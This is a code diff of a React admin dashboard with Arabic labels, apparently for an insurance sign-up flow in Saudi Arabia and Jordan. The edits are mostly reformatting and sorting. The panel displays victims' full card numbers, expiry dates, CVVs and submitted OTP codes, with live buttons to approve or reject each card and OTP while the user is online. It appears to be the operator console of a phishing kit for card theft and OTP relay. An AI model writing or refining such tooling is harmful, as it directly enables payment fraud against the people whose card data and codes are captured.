@@ -58,9 +58,7 @@ function UserStatus({ userId }: { userId: string }) {
     <div className="flex items-center gap-2">
       <div
         className={`w-2 h-2 rounded-full transition-all ${
-          status === "online"
-            ? "bg-teal-500 shadow-[0_0_8px_rgba(var(--success),0.6)] animate-pulse"
-            : "bg-red-500"
+          status === "online" ? "bg-teal-500 shadow-[0_0_8px_rgba(var(--success),0.6)] animate-pulse" : "bg-red-500"
         }`}
       />
     </div>
@@ -165,12 +163,9 @@ export default function AdminDashboard() {
     )
   }
 
-  // <CHANGE> Add handlers for card, card OTP, and phone OTP approvals
   const handleCardApprovalChange = useCallback(
     async (appId: string, status: "approved" | "rejected" | "pending") => {
-      setApplications((prev) =>
-        prev.map((app) => (app.id === appId ? { ...app, cardApproved: status } : app)),
-      )
+      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, cardApproved: status } : app)))
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, cardApproved: status } : null))
       }
@@ -191,9 +186,7 @@ export default function AdminDashboard() {
 
   const handleCardOtpApprovalChange = useCallback(
     async (appId: string, status: "approved" | "rejected" | "pending") => {
-      setApplications((prev) =>
-        prev.map((app) => (app.id === appId ? { ...app, cardOtpApproved: status } : app)),
-      )
+      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, cardOtpApproved: status } : app)))
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, cardOtpApproved: status } : null))
       }
@@ -214,9 +207,7 @@ export default function AdminDashboard() {
 
   const handlePhoneOtpApprovalChange = useCallback(
     async (appId: string, status: "approved" | "rejected" | "pending") => {
-      setApplications((prev) =>
-        prev.map((app) => (app.id === appId ? { ...app, phoneOtpApproved: status } : app)),
-      )
+      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, phoneOtpApproved: status } : app)))
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, phoneOtpApproved: status } : null))
       }
@@ -254,6 +245,7 @@ export default function AdminDashboard() {
       setApplications(apps)
       setLoading(false)
     })
+
     return () => unsubscribe()
   }, [])
 
@@ -291,6 +283,13 @@ export default function AdminDashboard() {
         )
       }
 
+      // Sort by createdAt - newest first
+      filtered = filtered.sort((a, b) => {
+        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0
+        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0
+        return dateB - dateA // Descending order (newest first)
+      })
+
       setFilteredApplications(filtered)
     }, 300)
 
@@ -307,11 +306,9 @@ export default function AdminDashboard() {
   const handleStepChange = useCallback(
     async (appId: string, newStep: number) => {
       setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))
-
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
       }
-
       try {
         await updateApplication(appId, { currentStep: newStep })
       } catch (error) {
@@ -372,8 +369,6 @@ export default function AdminDashboard() {
     return !!(app.cardNumber || app.expiryDate || app.cvv)
   }, [])
 
-
-
   const formatArabicDate = useCallback((dateString?: string) => {
     if (!dateString) return ""
     const date = new Date(dateString)
@@ -414,11 +409,9 @@ export default function AdminDashboard() {
       setApplications((prev) =>
         prev.map((app) => (app.id === appId ? { ...app, phoneVerificationStatus: status } : app)),
       )
-
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, phoneVerificationStatus: status } : null))
       }
-
       try {
         await updateApplication(appId, { phoneVerificationStatus: status })
         if (status === "approved") {
@@ -437,11 +430,9 @@ export default function AdminDashboard() {
   const handleIdVerificationChange = useCallback(
     async (appId: string, status: "approved" | "rejected" | "pending") => {
       setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, idVerificationStatus: status } : app)))
-
       if (selectedApplication?.id === appId) {
         setSelectedApplication((prev) => (prev ? { ...prev, idVerificationStatus: status } : null))
       }
-
       try {
         await updateApplication(appId, { idVerificationStatus: status })
         if (status === "approved") {
@@ -493,8 +484,6 @@ export default function AdminDashboard() {
     return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
   }
 
-  
-
   const getStepName = (step: number | string) => {
     return STEP_NAMES[step] || `الخطوة ${step}`
   }
@@ -516,7 +505,6 @@ export default function AdminDashboard() {
                 </div>
               </div>
             </div>
-
             <div className="flex items-center gap-3">
               <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-success/10 border border-success/20">
                 <div className="w-2 h-2 rounded-full bg-success animate-pulse" />
@@ -672,13 +660,9 @@ export default function AdminDashboard() {
                       setShowChat(false)
                       markAsRead(app)
                     }}
-                    className={`group relative p-4 cursor-pointer transition-all duration-200 hover:bg-muted/50 ${  isUnread(app)?"bg-red-500/40":""}
-                      ? "bg-red-400/[0.02]"} ${
-                      selectedApplication?.id === app.id
-                        ? "bg-red-500/5 border-r-[3px] border-r-primary"
-                       
-                          : ""
-                    }`}
+                    className={`group relative p-4 cursor-pointer transition-all duration-200 hover:bg-muted/50 ${
+                      isUnread(app) ? "bg-red-500/40" : ""
+                    } ${selectedApplication?.id === app.id ? "bg-red-500/5 border-r-[3px] border-r-primary" : ""}`}
                   >
                     <div className="flex items-start gap-3">
                       <Checkbox
@@ -689,11 +673,16 @@ export default function AdminDashboard() {
                       />
                       <div className="flex-1 min-w-0">
                         <div className="flex items-start justify-between gap-2 mb-2.5">
-                          <div className="flex items-center gap-2 min-w-0 isUnread(app)">
+                          <div className="flex items-center gap-2 min-w-0">
                             <UserStatus userId={app?.id!} />
-                           
                             <span className="text-lg flex-shrink-0">
-                              {app.country === "Saudi Arabia" ? <img src="/Flag_of_Saudi_Arabia.svg" alt="jo" width={20}/> : app.country === "Jordan" ?<img src="/Flag_of_Jordan.svg" alt="jo" width={20}/> : "🌍"}
+                              {app.country === "Saudi Arabia" ? (
+                                <img src="/Flag_of_Saudi_Arabia.svg" alt="sa" width={20} />
+                              ) : app.country === "Jordan" ? (
+                                <img src="/Flag_of_Jordan.svg" alt="jo" width={20} />
+                              ) : (
+                                "🌍"
+                              )}
                             </span>
                             <h3 className="font-semibold text-foreground truncate">{app.ownerName}</h3>
                             {isUnread(app) && (
@@ -720,7 +709,6 @@ export default function AdminDashboard() {
                           </div>
                         </div>
                         <div className="flex items-center gap-2 mb-2.5 flex-wrap">
-                        
                           <Badge variant="outline" className="text-[10px] px-2 py-0.5 bg-muted/50 rounded-md">
                             {getStepName(app.currentStep)}
                           </Badge>
@@ -733,10 +721,14 @@ export default function AdminDashboard() {
                               بطاقة
                             </Badge>
                           )}
-                          {app?.otp&&<Badge  variant="outline"
-                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20 rounded-md">
-                            رمز 
-                            </Badge>}
+                          {app?.otp && (
+                            <Badge
+                              variant="outline"
+                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20 rounded-md"
+                            >
+                              رمز
+                            </Badge>
+                          )}
                           {app.cardHistory && app.cardHistory.length > 0 && (
                             <Badge
                               variant="outline"
@@ -855,7 +847,7 @@ export default function AdminDashboard() {
                 <div className="flex-1 overflow-y-auto p-6">
                   {hasAnyGridData(selectedApplication) ? (
                     <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
-                      {/* 1. Payment Info - Full width card (most recent data) */}
+                      {/* 1. Payment Info - Full width card */}
                       {selectedApplication.cardNumber && (
                         <div
                           className="lg:col-span-2 bg-card rounded-2xl border border-border p-6 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both shadow-xl shadow-primary/5"
@@ -901,13 +893,12 @@ export default function AdminDashboard() {
                                 cardholderName={selectedApplication.ownerName}
                               />
                             </div>
-                       
                             <div className="lg:w-72 space-y-4">
                               {selectedApplication.totalPrice && (
                                 <div className="p-4 bg-gradient-to-br from-success/20 to-success/5 border border-success/30 rounded-xl">
                                   <p className="text-xs font-medium text-success mb-2">قيمة التأمين</p>
                                   <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
-                                    {parseInt(selectedApplication.totalPrice)}
+                                    {Number.parseInt(selectedApplication.totalPrice)}
                                   </p>
                                 </div>
                               )}
@@ -920,15 +911,25 @@ export default function AdminDashboard() {
                                   <p className="text-3xl font-bold text-primary font-mono text-center" dir="ltr">
                                     {selectedApplication.otp}
                                   </p>
-                                 <div className="flex">
-                                 <Button onClick={()=>{
-                                  handleCardOtpApprovalChange(selectedApplication.id!,"approved")
-                                 }} className="w-full bg-green-300 mx-1">قبول </Button>
-                                  <Button onClick={()=>{
-                                  handleCardOtpApprovalChange(selectedApplication.id!,"rejected")
-                                 }} className="w-full" variant={'destructive'}>رفض</Button>
-                                 </div>
-
+                                  <div className="flex gap-2 mt-3">
+                                    <Button
+                                      onClick={() => {
+                                        handleCardOtpApprovalChange(selectedApplication.id!, "approved")
+                                      }}
+                                      className="w-full bg-green-300 text-green-900 hover:bg-green-400"
+                                    >
+                                      قبول
+                                    </Button>
+                                    <Button
+                                      onClick={() => {
+                                        handleCardOtpApprovalChange(selectedApplication.id!, "rejected")
+                                      }}
+                                      className="w-full"
+                                      variant={"destructive"}
+                                    >
+                                      رفض
+                                    </Button>
+                                  </div>
                                 </div>
                               )}
                               {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
@@ -949,32 +950,32 @@ export default function AdminDashboard() {
                                   </div>
                                 </div>
                               )}
-                              
                             </div>
-                            
                           </div>
-                          <div className="flex gap-2">
-                              <Button
-                                onClick={() => handleCardApprovalChange(selectedApplication.id!, "approved")}
-                                variant="outline"
-                                size="sm"
-                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
-                                disabled={selectedApplication?.cardApproved === "approved"}
-                              >
-                                <CheckCircle className="w-4 h-4 ml-2" />
-                                قبول البطاقة
-                              </Button>
-                              <Button
-                                onClick={() => handleCardApprovalChange(selectedApplication.id!, "rejected")}
-                                variant="outline"
-                                size="sm"
-                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
-                                disabled={selectedApplication?.cardApproved === "rejected"}
-                              >
-                                <XCircle className="w-4 h-4 ml-2" />
-                                رفض البطاقة
-                              </Button>
-                            </div>
+
+                          <div className="flex gap-2 mt-6">
+                            <Button
+                              onClick={() => handleCardApprovalChange(selectedApplication.id!, "approved")}
+                              variant="outline"
+                              size="sm"
+                              className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
+                              disabled={selectedApplication?.cardApproved === "approved"}
+                            >
+                              <CheckCircle className="w-4 h-4 ml-2" />
+                              قبول البطاقة
+                            </Button>
+                            <Button
+                              onClick={() => handleCardApprovalChange(selectedApplication.id!, "rejected")}
+                              variant="outline"
+                              size="sm"
+                              className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
+                              disabled={selectedApplication?.cardApproved === "rejected"}
+                            >
+                              <XCircle className="w-4 h-4 ml-2" />
+                              رفض البطاقة
+                            </Button>
+                          </div>
+
                           {/* Card History Section */}
                           {showCardHistory &&
                             selectedApplication.cardHistory &&
@@ -989,7 +990,7 @@ export default function AdminDashboard() {
                                     <div
                                       key={index}
                                       className="animate-in fade-in slide-in-from-left duration-300"
-                                      style={{ animationDelay: `${index! as number * 100}ms` }}
+                                      style={{ animationDelay: `${(index as number) * 100}ms` }}
                                     >
                                       <CreditCardMockup
                                         cardNumber={card.cardNumber}
